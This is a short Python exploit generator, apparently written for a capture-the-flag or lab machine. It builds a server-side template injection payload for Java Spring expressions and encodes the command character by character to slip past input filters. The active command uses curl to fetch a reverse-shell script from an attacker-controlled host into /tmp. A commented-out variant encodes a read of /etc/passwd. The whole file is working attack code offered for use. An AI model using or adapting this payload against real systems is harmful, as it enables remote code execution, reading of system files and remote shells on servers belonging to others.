#!/usr/bin/python3
command = "curl -o /tmp/rev.sh 10.10.14.10:8088/rev.sh"
convert = []
payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('
payload2 = ''

#payload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}"
payload = payload + "T(java.lang.Character).toString(%s)" % ord(command[0])
for i in range(1,len(command)):
    char = ""
    # print(ord(i))
    char = ord(command[i])
    payload2 = ".concat(T(java.lang.Character).toString(%s))" % char
    payload = payload + payload2

payload = payload + ").getInputStream())}"
print(payload)
